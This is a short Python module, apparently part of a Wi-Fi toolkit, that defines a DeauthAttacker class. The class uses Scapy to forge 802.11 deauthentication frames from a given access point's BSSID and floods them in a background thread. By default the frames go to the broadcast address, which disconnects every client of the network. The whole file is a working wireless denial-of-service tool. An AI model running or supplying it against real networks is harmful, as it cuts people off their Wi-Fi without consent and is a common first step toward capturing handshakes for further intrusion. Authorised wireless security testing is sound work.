import time
from scapy.all import *
from .wifi_tools import check_tool
import threading

class DeauthAttacker:
    def __init__(self):
        self.running = False
        self.thread = None

    def start_attack(self, interface, bssid, client="FF:FF:FF:FF:FF:FF", count=0):
        """
        Sends deauth packets using Scapy.
        client: Target client MAC or Broadcast (default).
        """
        self.running = True
        self.thread = threading.Thread(target=self._send_deauth, args=(interface, bssid, client, count))
        self.thread.start()
        return "Deauth attack started..."

    def _send_deauth(self, interface, bssid, client, count):
        # 802.11 Deauth frame
        # Reason 7: Class 3 frame received from nonassociated STA
        dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        
        c = 0
        while self.running:
            try:
                sendp(packet, iface=interface, count=10, verbose=False) # Send burst of 10
                c += 10
                if count > 0 and c >= count:
                    break
                time.sleep(0.1) # Prevent total lockup
            except Exception as e:
                print(f"Deauth Error: {e}")
                self.running = False
                break

    def stop_attack(self):
        self.running = False
        if self.thread:
            self.thread.join()
        return "Deauth attack stopped."
